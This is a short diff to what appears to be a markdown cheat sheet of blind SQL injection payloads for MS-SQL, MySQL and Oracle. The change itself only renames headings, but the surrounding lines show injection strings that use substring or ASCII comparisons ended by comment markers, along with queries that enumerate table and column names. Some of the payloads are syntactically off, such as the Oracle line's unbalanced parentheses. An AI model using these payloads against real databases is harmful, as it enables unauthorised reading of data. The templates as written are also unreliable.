@@ -1,5 +1,5 @@
 # [MS-SQL]  
-* Shape  
+## Blind Shape  
 ``` sql
 OO' and substring((query), 1, 1) < 'a'--  
 ```  
@@ -25,7 +25,7 @@ select top 1 [Column Name] from [Table Name]
 ```
   
 # [MySQL]  
-* Shape  
+## Blind Shape  
 ``` sql
 ???' and ascii(substr((query), 1, 1)) > 'a'#  
 ```  
@@ -37,7 +37,7 @@ select table_name from information_schema.tables where table_type='base table' l
 ```
   
 # [Oracle]   
-* Shape   
+## Blind Shape  
 ``` sql
 and (ascii(SUBSTR(query),1,1))) > 1--  
 ```
